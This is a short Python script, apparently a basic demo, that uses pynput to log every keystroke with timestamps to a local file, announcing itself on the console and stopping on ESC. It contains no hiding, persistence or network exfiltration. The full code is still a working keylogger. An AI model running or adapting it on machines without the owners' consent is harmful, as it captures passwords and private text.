from pynput import keyboard
import logging
from datetime import datetime

# Create a log file with current date and time
log_filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
# Set up logging
logging.basicConfig(
    filename=log_filename,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)
# Define what to do when a key is pressed
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")
        
# If ESC is pressed, stop listener
    if key == keyboard.Key.esc:
        print(" Keylogging has been stopped.")
        return False 
    
# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    print(" Keylogger is running... (Press ESC to stop)")
    listener.join()
